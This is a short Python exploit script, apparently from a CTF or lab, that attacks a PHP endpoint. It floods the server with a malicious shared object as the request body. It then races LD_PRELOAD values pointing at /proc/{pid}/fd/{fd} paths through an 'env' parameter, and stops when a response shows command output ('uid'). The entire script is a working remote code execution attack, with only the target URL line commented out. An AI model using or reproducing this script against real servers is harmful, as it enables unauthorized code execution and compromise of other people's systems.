import requests
import _thread

f=open("D:/hook_exp2.so",'rb')
data=f.read()
# url="http://172.31.5.47:8888/"


def upload():
    print("start upload")
    while True:
        requests.get(url+"index.php",data=data)

def preload(fd):
    while True:
        print("start ld_preload")
        for pid in range(10,20):
            file = f'/proc/{pid}/fd/{fd}'
            # print(url+f"index.php?env=LD_PRELOAD={file}")
            resp = requests.get(url+f"index.php?env=LD_PRELOAD={file}")
            # print(resp.text)
            if 'uid' in resp.text:
                print("finished")
                exit()

try:
    _thread.start_new_thread(upload, ())
    for fd in range(1, 20):
        _thread.start_new_thread(preload,(fd,))
except:
    print("error")

while True:
    pass
